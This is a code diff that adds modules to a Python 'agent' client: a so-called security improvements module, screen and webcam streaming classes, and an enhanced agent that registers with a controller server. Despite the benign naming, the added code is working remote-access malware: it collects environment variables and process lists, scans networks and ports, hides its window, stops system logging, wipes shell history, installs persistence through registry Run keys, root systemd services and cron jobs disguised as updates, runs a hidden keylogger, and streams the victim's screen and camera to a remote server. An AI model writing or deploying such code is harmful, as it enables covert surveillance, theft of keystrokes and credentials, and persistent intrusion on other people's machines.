@@ -4576,5 +4576,1428 @@ def test_process_termination_functionality():
             print(f"Error: {e}")
 
 # ========================================================================================
+# SECURITY IMPROVEMENTS MODULE
+# From: security_improvements.py
+# ========================================================================================
+
+import hashlib
+import hmac
+import secrets
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import ipaddress
+
+class SecureAuth:
+    """Secure authentication system with token-based auth"""
+    
+    def __init__(self, secret_key: Optional[str] = None):
+        self.secret_key = secret_key or secrets.token_urlsafe(32)
+        self.active_tokens: Dict[str, Dict[str, Any]] = {}
+        self.max_token_age = 3600  # 1 hour
+        
+    def generate_token(self, agent_id: str, permissions: List[str] = None) -> str:
+        """Generate a secure authentication token"""
+        permissions = permissions or ["basic"]
+        
+        token_data = {
+            "agent_id": agent_id,
+            "permissions": permissions,
+            "created_at": time.time(),
+            "expires_at": time.time() + self.max_token_age,
+            "nonce": secrets.token_hex(16)
+        }
+        
+        # Create token signature
+        token_string = json.dumps(token_data, sort_keys=True)
+        signature = hmac.new(
+            self.secret_key.encode(),
+            token_string.encode(),
+            hashlib.sha256
+        ).hexdigest()
+        
+        token = base64.b64encode(f"{token_string}:{signature}".encode()).decode()
+        self.active_tokens[token] = token_data
+        
+        print(f"Generated token for agent {agent_id}")
+        return token
+    
+    def validate_token(self, token: str) -> Optional[Dict[str, Any]]:
+        """Validate an authentication token"""
+        try:
+            decoded = base64.b64decode(token.encode()).decode()
+            token_string, signature = decoded.rsplit(":", 1)
+            
+            # Verify signature
+            expected_signature = hmac.new(
+                self.secret_key.encode(),
+                token_string.encode(),
+                hashlib.sha256
+            ).hexdigest()
+            
+            if not hmac.compare_digest(signature, expected_signature):
+                print("Invalid token signature")
+                return None
+            
+            token_data = json.loads(token_string)
+            
+            # Check expiration
+            if time.time() > token_data["expires_at"]:
+                print("Token expired")
+                if token in self.active_tokens:
+                    del self.active_tokens[token]
+                return None
+            
+            return token_data
+            
+        except Exception as e:
+            print(f"Token validation error: {e}")
+            return None
+    
+    def revoke_token(self, token: str):
+        """Revoke a token"""
+        if token in self.active_tokens:
+            del self.active_tokens[token]
+            print("Token revoked")
+    
+    def cleanup_expired_tokens(self):
+        """Remove expired tokens"""
+        current_time = time.time()
+        expired_tokens = [
+            token for token, data in self.active_tokens.items()
+            if current_time > data["expires_at"]
+        ]
+        
+        for token in expired_tokens:
+            del self.active_tokens[token]
+        
+        if expired_tokens:
+            print(f"Cleaned up {len(expired_tokens)} expired tokens")
+
+class EncryptedComms:
+    """Encrypted communications for sensitive data"""
+    
+    def __init__(self, password: str):
+        self.key = self._derive_key(password)
+        self.cipher = Fernet(self.key)
+    
+    def _derive_key(self, password: str) -> bytes:
+        """Derive encryption key from password"""
+        salt = b'stable_salt_for_demo'  # In production, use random salt
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000,
+        )
+        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
+        return key
+    
+    def encrypt(self, data: str) -> str:
+        """Encrypt string data"""
+        encrypted = self.cipher.encrypt(data.encode())
+        return base64.b64encode(encrypted).decode()
+    
+    def decrypt(self, encrypted_data: str) -> str:
+        """Decrypt string data"""
+        try:
+            encrypted = base64.b64decode(encrypted_data.encode())
+            decrypted = self.cipher.decrypt(encrypted)
+            return decrypted.decode()
+        except Exception as e:
+            print(f"Decryption error: {e}")
+            return ""
+
+class SystemRecon:
+    """Advanced system reconnaissance capabilities"""
+    
+    @staticmethod
+    def get_system_info() -> Dict[str, Any]:
+        """Gather comprehensive system information"""
+        info = {
+            "hostname": socket.gethostname(),
+            "platform": os.name,
+            "architecture": "unknown",
+            "cpu_count": os.cpu_count(),
+            "environment_vars": dict(os.environ),
+            "network_interfaces": [],
+            "running_processes": [],
+            "open_ports": [],
+            "user_accounts": [],
+            "security_software": []
+        }
+        
+        try:
+            import platform
+            info["platform_detailed"] = platform.platform()
+            info["architecture"] = platform.architecture()
+            info["processor"] = platform.processor()
+        except:
+            pass
+        
+        try:
+            import psutil
+            
+            # Network interfaces
+            for interface, addrs in psutil.net_if_addrs().items():
+                for addr in addrs:
+                    info["network_interfaces"].append({
+                        "interface": interface,
+                        "family": str(addr.family),
+                        "address": addr.address,
+                        "netmask": addr.netmask
+                    })
+            
+            # Running processes
+            for proc in psutil.process_iter(['pid', 'name', 'username']):
+                try:
+                    info["running_processes"].append(proc.info)
+                except:
+                    pass
+            
+            # Network connections
+            for conn in psutil.net_connections():
+                if conn.laddr:
+                    info["open_ports"].append({
+                        "port": conn.laddr.port,
+                        "family": str(conn.family),
+                        "type": str(conn.type),
+                        "status": str(conn.status) if conn.status else "UNKNOWN"
+                    })
+                    
+        except ImportError:
+            print("psutil not available for detailed system info")
+        
+        return info
+    
+    @staticmethod
+    def scan_network(target_network: str = "192.168.1.0/24") -> List[str]:
+        """Scan network for active hosts"""
+        active_hosts = []
+        
+        try:
+            network = ipaddress.ip_network(target_network, strict=False)
+            
+            for ip in network.hosts():
+                if SystemRecon._ping_host(str(ip)):
+                    active_hosts.append(str(ip))
+                    
+        except Exception as e:
+            print(f"Network scan error: {e}")
+        
+        return active_hosts
+    
+    @staticmethod
+    def _ping_host(host: str, timeout: int = 1) -> bool:
+        """Ping a host to check if it's alive"""
+        try:
+            if os.name == 'nt':  # Windows
+                result = subprocess.run(
+                    ['ping', '-n', '1', '-w', str(timeout * 1000), host],
+                    capture_output=True, text=True, timeout=timeout + 1
+                )
+            else:  # Unix/Linux
+                result = subprocess.run(
+                    ['ping', '-c', '1', '-W', str(timeout), host],
+                    capture_output=True, text=True, timeout=timeout + 1
+                )
+            return result.returncode == 0
+        except:
+            return False
+    
+    @staticmethod
+    def port_scan(host: str, ports: List[int] = None) -> List[int]:
+        """Scan specific ports on a host"""
+        if ports is None:
+            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5900]
+        
+        open_ports = []
+        
+        for port in ports:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((host, port))
+                sock.close()
+                
+                if result == 0:
+                    open_ports.append(port)
+                    
+            except Exception:
+                pass
+        
+        return open_ports
+
+class StealthOperations:
+    """Stealth and evasion capabilities"""
+    
+    @staticmethod
+    def hide_process():
+        """Attempt to hide the current process"""
+        try:
+            if os.name == 'nt':  # Windows
+                import ctypes
+                from ctypes import wintypes
+                
+                # Set process to run in background
+                kernel32 = ctypes.windll.kernel32
+                user32 = ctypes.windll.user32
+                
+                # Hide console window
+                console_window = kernel32.GetConsoleWindow()
+                if console_window:
+                    user32.ShowWindow(console_window, 0)  # SW_HIDE
+                    
+                print("Process hidden on Windows")
+                return True
+                
+        except Exception as e:
+            print(f"Process hiding failed: {e}")
+        
+        return False
+    
+    @staticmethod
+    def disable_logging():
+        """Disable system logging temporarily"""
+        try:
+            if os.name == 'posix':  # Unix/Linux
+                # Redirect logs to /dev/null
+                subprocess.run(['sudo', 'service', 'rsyslog', 'stop'], 
+                             capture_output=True, check=False)
+                print("System logging disabled")
+                return True
+        except:
+            pass
+        return False
+    
+    @staticmethod
+    def clear_tracks():
+        """Clear evidence of activity"""
+        commands_to_clear = []
+        
+        if os.name == 'posix':  # Unix/Linux
+            commands_to_clear = [
+                'history -c',  # Clear command history
+                'unset HISTFILE',  # Disable history file
+                'rm -f ~/.bash_history ~/.zsh_history',  # Remove history files
+            ]
+        elif os.name == 'nt':  # Windows
+            commands_to_clear = [
+                'powershell -Command "Clear-History"',
+                'del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'
+            ]
+        
+        for cmd in commands_to_clear:
+            try:
+                subprocess.run(cmd, shell=True, capture_output=True, check=False)
+            except:
+                pass
+        
+        print("Cleared activity tracks")
+
+class PersistenceMechanism:
+    """Advanced persistence mechanisms"""
+    
+    @staticmethod
+    def create_service_persistence(service_name: str, executable_path: str) -> bool:
+        """Create system service for persistence"""
+        try:
+            if os.name == 'nt':  # Windows
+                # Create Windows service
+                service_cmd = f'sc create {service_name} binPath= "{executable_path}" start= auto'
+                result = subprocess.run(service_cmd, shell=True, capture_output=True)
+                return result.returncode == 0
+                
+            else:  # Unix/Linux
+                # Create systemd service
+                service_content = f"""[Unit]
+Description={service_name}
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={executable_path}
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                service_file = f"/etc/systemd/system/{service_name}.service"
+                with open(service_file, 'w') as f:
+                    f.write(service_content)
+                
+                subprocess.run(['systemctl', 'enable', service_name], check=True)
+                subprocess.run(['systemctl', 'start', service_name], check=True)
+                return True
+                
+        except Exception as e:
+            print(f"Service persistence failed: {e}")
+            return False
+    
+    @staticmethod
+    def create_registry_persistence(key_name: str, executable_path: str) -> bool:
+        """Create Windows registry persistence"""
+        try:
+            if os.name == 'nt':
+                import winreg
+                
+                # Add to startup registry key
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_SET_VALUE
+                )
+                
+                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
+                winreg.CloseKey(key)
+                
+                print("Registry persistence created")
+                return True
+                
+        except Exception as e:
+            print(f"Registry persistence failed: {e}")
+        
+        return False
+    
+    @staticmethod
+    def create_cron_persistence(job_name: str, executable_path: str, schedule: str = "*/5 * * * *") -> bool:
+        """Create cron job persistence on Unix/Linux"""
+        try:
+            if os.name == 'posix':
+                cron_entry = f"{schedule} {executable_path} # {job_name}\n"
+                
+                # Add to user crontab
+                result = subprocess.run(
+                    ['crontab', '-l'], 
+                    capture_output=True, text=True, check=False
+                )
+                
+                current_crontab = result.stdout if result.returncode == 0 else ""
+                
+                if job_name not in current_crontab:
+                    new_crontab = current_crontab + cron_entry
+                    
+                    process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
+                    process.communicate(input=new_crontab)
+                    
+                    print("Cron persistence created")
+                    return True
+                    
+        except Exception as e:
+            print(f"Cron persistence failed: {e}")
+        
+        return False
+
+class AdvancedKeylogger:
+    """Advanced keylogging with stealth features"""
+    
+    def __init__(self, log_file: str = ".keylog.dat"):
+        self.log_file = log_file
+        self.running = False
+        self.thread: Optional[threading.Thread] = None
+        self.keys_buffer = []
+        self.buffer_size = 100
+        
+    def start(self):
+        """Start keylogging"""
+        if not self.running:
+            self.running = True
+            self.thread = threading.Thread(target=self._keylog_loop, daemon=True)
+            self.thread.start()
+            print("Keylogger started")
+    
+    def stop(self):
+        """Stop keylogging"""
+        if self.running:
+            self.running = False
+            if self.thread:
+                self.thread.join(timeout=5)
+            self._flush_buffer()
+            print("Keylogger stopped")
+    
+    def _keylog_loop(self):
+        """Main keylogging loop"""
+        try:
+            from pynput import keyboard
+            
+            def on_press(key):
+                try:
+                    if hasattr(key, 'char') and key.char:
+                        self.keys_buffer.append(key.char)
+                    else:
+                        self.keys_buffer.append(f'[{key.name}]')
+                    
+                    if len(self.keys_buffer) >= self.buffer_size:
+                        self._flush_buffer()
+                        
+                except AttributeError:
+                    self.keys_buffer.append(f'[{str(key)}]')
+            
+            with keyboard.Listener(on_press=on_press) as listener:
+                while self.running:
+                    time.sleep(0.1)
+                    
+        except Exception as e:
+            print(f"Keylogger error: {e}")
+    
+    def _flush_buffer(self):
+        """Flush key buffer to file"""
+        if self.keys_buffer:
+            try:
+                with open(self.log_file, 'a', encoding='utf-8') as f:
+                    f.write(''.join(self.keys_buffer))
+                self.keys_buffer.clear()
+            except Exception as e:
+                print(f"Buffer flush error: {e}")
+
+class SecurityEnhancements:
+    """Main security enhancements manager"""
+    
+    def __init__(self, password: str = "default_password"):
+        self.auth = SecureAuth()
+        self.crypto = EncryptedComms(password)
+        self.recon = SystemRecon()
+        self.stealth = StealthOperations()
+        self.persistence = PersistenceMechanism()
+        self.keylogger = AdvancedKeylogger()
+        
+    def initialize_security(self, agent_id: str) -> str:
+        """Initialize all security features"""
+        print("Initializing security features...")
+        
+        # Generate authentication token
+        token = self.auth.generate_token(agent_id, ["admin", "stealth", "persistence"])
+        
+        # Enable stealth mode
+        self.stealth.hide_process()
+        
+        # Start keylogger
+        self.keylogger.start()
+        
+        print("Security features initialized")
+        return token
+    
+    def gather_intelligence(self) -> Dict[str, Any]:
+        """Gather comprehensive system intelligence"""
+        print("Gathering system intelligence...")
+        
+        intelligence = {
+            "system_info": self.recon.get_system_info(),
+            "network_scan": self.recon.scan_network(),
+            "timestamp": time.time()
+        }
+        
+        # Encrypt sensitive data
+        encrypted_intel = self.crypto.encrypt(json.dumps(intelligence))
+        
+        return {
+            "encrypted_data": encrypted_intel,
+            "status": "success"
+        }
+    
+    def establish_persistence(self, executable_path: str) -> bool:
+        """Establish multiple persistence mechanisms"""
+        print("Establishing persistence...")
+        
+        success = False
+        
+        # Try multiple persistence methods
+        if os.name == 'nt':  # Windows
+            success |= self.persistence.create_registry_persistence("SecurityUpdate", executable_path)
+            success |= self.persistence.create_service_persistence("SecurityService", executable_path)
+        else:  # Unix/Linux
+            success |= self.persistence.create_cron_persistence("system_update", executable_path)
+            success |= self.persistence.create_service_persistence("security-daemon", executable_path)
+        
+        return success
+    
+    def cleanup_and_exit(self):
+        """Clean up and exit safely"""
+        print("Cleaning up...")
+        
+        # Stop keylogger
+        self.keylogger.stop()
+        
+        # Clear tracks
+        self.stealth.clear_tracks()
+        
+        # Clean up tokens
+        self.auth.cleanup_expired_tokens()
+        
+        print("Cleanup complete")
+
+# ========================================================================================
+# STREAMING FIXES MODULE
+# From: streaming_fixes.py
+# ========================================================================================
+
+class StreamingStats:
+    """Track streaming performance statistics"""
+    
+    def __init__(self):
+        self.frames_sent = 0
+        self.bytes_sent = 0
+        self.frames_dropped = 0
+        self.start_time = time.time()
+        self.last_fps_time = time.time()
+        self.fps = 0
+        
+    def update_frame(self, bytes_count: int):
+        """Update stats when a frame is sent"""
+        self.frames_sent += 1
+        self.bytes_sent += bytes_count
+        
+        # Calculate FPS every second
+        current_time = time.time()
+        if current_time - self.last_fps_time >= 1.0:
+            self.fps = self.frames_sent / (current_time - self.start_time)
+            self.last_fps_time = current_time
+    
+    def drop_frame(self):
+        """Record dropped frame"""
+        self.frames_dropped += 1
+    
+    def get_stats(self) -> Dict[str, Any]:
+        """Get current statistics"""
+        runtime = time.time() - self.start_time
+        return {
+            "runtime": runtime,
+            "frames_sent": self.frames_sent,
+            "frames_dropped": self.frames_dropped,
+            "bytes_sent": self.bytes_sent,
+            "fps": self.fps,
+            "avg_frame_size": self.bytes_sent / max(1, self.frames_sent),
+            "drop_rate": self.frames_dropped / max(1, self.frames_sent + self.frames_dropped)
+        }
+
+class AdaptiveCompression:
+    """Adaptive compression based on network conditions"""
+    
+    def __init__(self, initial_quality: int = 85):
+        self.quality = initial_quality
+        self.min_quality = 30
+        self.max_quality = 95
+        self.response_times = []
+        self.max_samples = 10
+        
+    def update_response_time(self, response_time: float):
+        """Update compression based on response time"""
+        self.response_times.append(response_time)
+        if len(self.response_times) > self.max_samples:
+            self.response_times.pop(0)
+            
+        # Adjust quality based on average response time
+        avg_time = sum(self.response_times) / len(self.response_times)
+        
+        if avg_time > 0.5:  # High latency
+            self.quality = max(self.min_quality, self.quality - 5)
+        elif avg_time < 0.1:  # Low latency
+            self.quality = min(self.max_quality, self.quality + 2)
+    
+    def get_quality(self) -> int:
+        """Get current quality setting"""
+        return self.quality
+
+class ImprovedScreenStreamer:
+    """Improved screen streaming with better error handling and performance"""
+    
+    def __init__(self, server_url: str, agent_id: str, target_fps: int = 30):
+        self.server_url = server_url
+        self.agent_id = agent_id
+        self.target_fps = target_fps
+        self.frame_time = 1.0 / target_fps
+        self.running = False
+        self.thread: Optional[threading.Thread] = None
+        
+        # Performance tracking
+        self.stats = StreamingStats()
+        self.compression = AdaptiveCompression()
+        
+        # Frame processing
+        self.last_frame_hash = None
+        self.frame_skip_count = 0
+        self.max_skip_frames = 3
+        
+        # Connection settings
+        self.url = f"{server_url}/stream/{agent_id}"
+        self.headers = {'Content-Type': 'image/jpeg'}
+        self.timeout = 0.1
+        
+    def start(self):
+        """Start the streaming thread"""
+        if not self.running:
+            self.running = True
+            self.thread = threading.Thread(target=self._stream_loop, daemon=True)
+            self.thread.start()
+            print(f"Started screen streaming for agent {self.agent_id}")
+    
+    def stop(self):
+        """Stop the streaming thread"""
+        if self.running:
+            self.running = False
+            if self.thread:
+                self.thread.join(timeout=5)
+            print(f"Stopped screen streaming for agent {self.agent_id}")
+            
+            # Log final stats
+            final_stats = self.stats.get_stats()
+            print(f"Final streaming stats: {final_stats}")
+    
+    def _stream_loop(self):
+        """Main streaming loop with enhanced error handling"""
+        with mss.mss() as sct:
+            consecutive_errors = 0
+            max_consecutive_errors = 10
+            
+            while self.running and consecutive_errors < max_consecutive_errors:
+                try:
+                    frame_start = time.time()
+                    
+                    # Capture screen
+                    frame_data = self._capture_frame(sct)
+                    if frame_data is None:
+                        consecutive_errors += 1
+                        continue
+                    
+                    # Check if frame is duplicate
+                    if self._is_duplicate_frame(frame_data):
+                        self._maintain_fps(frame_start)
+                        continue
+                    
+                    # Encode frame
+                    encoded_frame = self._encode_frame(frame_data)
+                    if encoded_frame is None:
+                        consecutive_errors += 1
+                        continue
+                    
+                    # Send frame
+                    success = self._send_frame(encoded_frame, frame_start)
+                    if success:
+                        consecutive_errors = 0
+                        self.stats.update_frame(len(encoded_frame))
+                    else:
+                        consecutive_errors += 1
+                        self.stats.drop_frame()
+                    
+                    # Maintain target FPS
+                    self._maintain_fps(frame_start)
+                    
+                except Exception as e:
+                    print(f"Error in streaming loop: {e}")
+                    consecutive_errors += 1
+                    time.sleep(0.1)
+            
+            if consecutive_errors >= max_consecutive_errors:
+                print("Too many consecutive errors, stopping stream")
+    
+    def _capture_frame(self, sct) -> Optional[np.ndarray]:
+        """Capture screen frame with error handling"""
+        try:
+            # Capture primary monitor
+            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
+            sct_img = sct.grab(monitor)
+            
+            # Convert to numpy array
+            frame = np.array(sct_img)
+            
+            # Handle different color formats
+            if frame.shape[2] == 4:  # BGRA
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
+            elif frame.shape[2] == 3:  # BGR
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            
+            return frame
+            
+        except Exception as e:
+            print(f"Error capturing frame: {e}")
+            return None
+    
+    def _is_duplicate_frame(self, frame: np.ndarray) -> bool:
+        """Check if frame is duplicate to previous frame"""
+        try:
+            # Create hash of frame data
+            frame_hash = hashlib.md5(frame.tobytes()).hexdigest()
+            
+            if frame_hash == self.last_frame_hash:
+                self.frame_skip_count += 1
+                if self.frame_skip_count < self.max_skip_frames:
+                    return True
+            else:
+                self.frame_skip_count = 0
+                self.last_frame_hash = frame_hash
+            
+            return False
+            
+        except Exception as e:
+            print(f"Error checking frame duplicate: {e}")
+            return False
+    
+    def _encode_frame(self, frame: np.ndarray) -> Optional[bytes]:
+        """Encode frame with adaptive compression"""
+        try:
+            # Resize large frames for better performance
+            height, width = frame.shape[:2]
+            if width > 1920:
+                scale = 1920 / width
+                new_width = int(width * scale)
+                new_height = int(height * scale)
+                frame = cv2.resize(frame, (new_width, new_height), 
+                                 interpolation=cv2.INTER_AREA)
+            
+            # Convert RGB to BGR for OpenCV
+            frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+            
+            # Encode with adaptive quality
+            quality = self.compression.get_quality()
+            success, buffer = cv2.imencode('.jpg', frame_bgr, [
+                cv2.IMWRITE_JPEG_QUALITY, quality,
+                cv2.IMWRITE_JPEG_OPTIMIZE, 1,
+                cv2.IMWRITE_JPEG_PROGRESSIVE, 1
+            ])
+            
+            if success:
+                return buffer.tobytes()
+            else:
+                print("Failed to encode frame")
+                return None
+                
+        except Exception as e:
+            print(f"Error encoding frame: {e}")
+            return None
+    
+    def _send_frame(self, frame_data: bytes, start_time: float) -> bool:
+        """Send frame to server with response time tracking"""
+        try:
+            response = requests.post(
+                self.url, 
+                data=frame_data, 
+                headers=self.headers, 
+                timeout=self.timeout
+            )
+            
+            # Update compression based on response time
+            response_time = time.time() - start_time
+            self.compression.update_response_time(response_time)
+            
+            return response.status_code == 200
+            
+        except requests.exceptions.Timeout:
+            # Timeout is acceptable for low-latency streaming
+            return False
+        except Exception as e:
+            print(f"Error sending frame: {e}")
+            return False
+    
+    def _maintain_fps(self, frame_start: float):
+        """Maintain target FPS timing"""
+        elapsed = time.time() - frame_start
+        sleep_time = max(0, self.frame_time - elapsed)
+        if sleep_time > 0:
+            time.sleep(sleep_time)
+
+class ImprovedCameraStreamer:
+    """Improved camera streaming with better error handling"""
+    
+    def __init__(self, server_url: str, agent_id: str, camera_id: int = 0, target_fps: int = 30):
+        self.server_url = server_url
+        self.agent_id = agent_id
+        self.camera_id = camera_id
+        self.target_fps = target_fps
+        self.frame_time = 1.0 / target_fps
+        self.running = False
+        self.thread: Optional[threading.Thread] = None
+        
+        # Performance tracking
+        self.stats = StreamingStats()
+        self.compression = AdaptiveCompression()
+        
+        # Camera settings
+        self.cap: Optional[cv2.VideoCapture] = None
+        self.url = f"{server_url}/camera/{agent_id}"
+        self.headers = {'Content-Type': 'image/jpeg'}
+        self.timeout = 0.5
+    
+    def start(self):
+        """Start camera streaming"""
+        if not self.running:
+            if self._init_camera():
+                self.running = True
+                self.thread = threading.Thread(target=self._stream_loop, daemon=True)
+                self.thread.start()
+                print(f"Started camera streaming for agent {self.agent_id}")
+            else:
+                print("Failed to initialize camera")
+    
+    def stop(self):
+        """Stop camera streaming"""
+        if self.running:
+            self.running = False
+            if self.thread:
+                self.thread.join(timeout=5)
+            if self.cap:
+                self.cap.release()
+            print(f"Stopped camera streaming for agent {self.agent_id}")
+            
+            # Log final stats
+            final_stats = self.stats.get_stats()
+            print(f"Final camera stats: {final_stats}")
+    
+    def _init_camera(self) -> bool:
+        """Initialize camera with proper settings"""
+        try:
+            # Try different backends
+            backends = [cv2.CAP_V4L2, cv2.CAP_ANY]
+            
+            for backend in backends:
+                self.cap = cv2.VideoCapture(self.camera_id, backend)
+                if self.cap.isOpened():
+                    break
+            
+            if not self.cap or not self.cap.isOpened():
+                print(f"Cannot open camera {self.camera_id}")
+                return False
+            
+            # Set camera properties
+            self.cap.set(cv2.CAP_PROP_FPS, self.target_fps)
+            self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+            self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+            self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+            
+            # Test capture
+            ret, frame = self.cap.read()
+            if not ret or frame is None:
+                print("Camera test capture failed")
+                return False
+            
+            print(f"Camera initialized: {frame.shape}")
+            return True
+            
+        except Exception as e:
+            print(f"Error initializing camera: {e}")
+            return False
+    
+    def _stream_loop(self):
+        """Main camera streaming loop"""
+        consecutive_errors = 0
+        max_consecutive_errors = 10
+        
+        while self.running and consecutive_errors < max_consecutive_errors:
+            try:
+                frame_start = time.time()
+                
+                # Capture frame
+                ret, frame = self.cap.read()
+                if not ret or frame is None:
+                    consecutive_errors += 1
+                    time.sleep(0.1)
+                    continue
+                
+                # Encode frame
+                encoded_frame = self._encode_frame(frame)
+                if encoded_frame is None:
+                    consecutive_errors += 1
+                    continue
+                
+                # Send frame
+                success = self._send_frame(encoded_frame, frame_start)
+                if success:
+                    consecutive_errors = 0
+                    self.stats.update_frame(len(encoded_frame))
+                else:
+                    consecutive_errors += 1
+                    self.stats.drop_frame()
+                
+                # Maintain target FPS
+                self._maintain_fps(frame_start)
+                
+            except Exception as e:
+                print(f"Error in camera loop: {e}")
+                consecutive_errors += 1
+                time.sleep(0.1)
+        
+        if consecutive_errors >= max_consecutive_errors:
+            print("Too many consecutive camera errors, stopping stream")
+    
+    def _encode_frame(self, frame: np.ndarray) -> Optional[bytes]:
+        """Encode camera frame"""
+        try:
+            quality = self.compression.get_quality()
+            success, buffer = cv2.imencode('.jpg', frame, [
+                cv2.IMWRITE_JPEG_QUALITY, quality,
+                cv2.IMWRITE_JPEG_OPTIMIZE, 1
+            ])
+            
+            if success:
+                return buffer.tobytes()
+            else:
+                print("Failed to encode camera frame")
+                return None
+                
+        except Exception as e:
+            print(f"Error encoding camera frame: {e}")
+            return None
+    
+    def _send_frame(self, frame_data: bytes, start_time: float) -> bool:
+        """Send camera frame to server"""
+        try:
+            response = requests.post(
+                self.url,
+                data=frame_data,
+                headers=self.headers,
+                timeout=self.timeout
+            )
+            
+            # Update compression based on response time
+            response_time = time.time() - start_time
+            self.compression.update_response_time(response_time)
+            
+            return response.status_code == 200
+            
+        except requests.exceptions.Timeout:
+            return False
+        except Exception as e:
+            print(f"Error sending camera frame: {e}")
+            return False
+    
+    def _maintain_fps(self, frame_start: float):
+        """Maintain target FPS"""
+        elapsed = time.time() - frame_start
+        sleep_time = max(0, self.frame_time - elapsed)
+        if sleep_time > 0:
+            time.sleep(sleep_time)
+
+class StreamManager:
+    """Manages multiple streams and provides status information"""
+    
+    def __init__(self, server_url: str, agent_id: str):
+        self.server_url = server_url
+        self.agent_id = agent_id
+        self.screen_streamer: Optional[ImprovedScreenStreamer] = None
+        self.camera_streamer: Optional[ImprovedCameraStreamer] = None
+    
+    def start_screen_stream(self, fps: int = 30):
+        """Start screen streaming"""
+        if self.screen_streamer is None or not self.screen_streamer.running:
+            self.screen_streamer = ImprovedScreenStreamer(
+                self.server_url, self.agent_id, fps
+            )
+            self.screen_streamer.start()
+            return True
+        return False
+    
+    def stop_screen_stream(self):
+        """Stop screen streaming"""
+        if self.screen_streamer and self.screen_streamer.running:
+            self.screen_streamer.stop()
+            return True
+        return False
+    
+    def start_camera_stream(self, fps: int = 30, camera_id: int = 0):
+        """Start camera streaming"""
+        if self.camera_streamer is None or not self.camera_streamer.running:
+            self.camera_streamer = ImprovedCameraStreamer(
+                self.server_url, self.agent_id, camera_id, fps
+            )
+            self.camera_streamer.start()
+            return True
+        return False
+    
+    def stop_camera_stream(self):
+        """Stop camera streaming"""
+        if self.camera_streamer and self.camera_streamer.running:
+            self.camera_streamer.stop()
+            return True
+        return False
+    
+    def stop_all_streams(self):
+        """Stop all active streams"""
+        self.stop_screen_stream()
+        self.stop_camera_stream()
+    
+    def get_status(self) -> Dict[str, Any]:
+        """Get streaming status and statistics"""
+        status = {
+            "screen_streaming": False,
+            "camera_streaming": False,
+            "screen_stats": None,
+            "camera_stats": None
+        }
+        
+        if self.screen_streamer and self.screen_streamer.running:
+            status["screen_streaming"] = True
+            status["screen_stats"] = self.screen_streamer.stats.get_stats()
+        
+        if self.camera_streamer and self.camera_streamer.running:
+            status["camera_streaming"] = True
+            status["camera_stats"] = self.camera_streamer.stats.get_stats()
+        
+        return status
+
+# ========================================================================================
+# ENHANCED AGENT MODULE
+# From: enhanced_agent.py
+# ========================================================================================
+
+class EnhancedAgent:
+    """Enhanced agent with all improvements integrated"""
+    
+    def __init__(self, server_url: str = "http://localhost:8080"):
+        self.server_url = server_url
+        self.agent_id = self._generate_enhanced_agent_id()
+        self.running = False
+        
+        # Enhanced components
+        self.stream_manager: Optional[StreamManager] = None
+        self.security: Optional[SecurityEnhancements] = None
+        
+        # Legacy support
+        self.streaming_enabled = False
+        self.camera_streaming_enabled = False
+        
+        # Initialize enhanced features
+        self._initialize_enhancements()
+        
+        print(f"Enhanced agent initialized with ID: {self.agent_id}")
+    
+    def _generate_enhanced_agent_id(self) -> str:
+        """Generate unique agent ID"""
+        try:
+            # Try to read existing ID
+            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
+            if os.path.exists(id_file):
+                with open(id_file, 'r') as f:
+                    return f.read().strip()
+        except:
+            pass
+        
+        # Generate new ID
+        agent_id = str(uuid.uuid4())
+        
+        try:
+            # Save ID for persistence
+            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
+            with open(id_file, 'w') as f:
+                f.write(agent_id)
+        except:
+            pass
+        
+        return agent_id
+    
+    def _initialize_enhancements(self):
+        """Initialize enhanced features"""
+        try:
+            # Initialize streaming manager
+            self.stream_manager = StreamManager(self.server_url, self.agent_id)
+            print("Enhanced streaming manager initialized")
+            
+            # Initialize security features
+            self.security = SecurityEnhancements()
+            token = self.security.initialize_security(self.agent_id)
+            print(f"Security features initialized with token: {token[:20]}...")
+            
+        except Exception as e:
+            print(f"Error initializing enhancements: {e}")
+    
+    def start_enhanced(self):
+        """Start the enhanced agent"""
+        print("Starting enhanced agent...")
+        self.running = True
+        
+        # Register with controller
+        self._register_with_controller()
+        
+        # Start main loop
+        self._enhanced_main_loop()
+    
+    def stop_enhanced(self):
+        """Stop the enhanced agent"""
+        print("Stopping enhanced agent...")
+        self.running = False
+        
+        # Stop all streams
+        self.stop_all_enhanced_streams()
+        
+        # Security cleanup
+        if self.security:
+            self.security.cleanup_and_exit()
+    
+    def _register_with_controller(self):
+        """Register agent with controller"""
+        try:
+            registration_data = {
+                "agent_id": self.agent_id,
+                "hostname": socket.gethostname(),
+                "platform": platform.system(),
+                "capabilities": self._get_enhanced_capabilities(),
+                "timestamp": time.time()
+            }
+            
+            response = requests.post(
+                f"{self.server_url}/register",
+                json=registration_data,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                print("Successfully registered with controller")
+            else:
+                print(f"Registration failed: {response.status_code}")
+                
+        except Exception as e:
+            print(f"Registration error: {e}")
+    
+    def _get_enhanced_capabilities(self) -> List[str]:
+        """Get agent capabilities"""
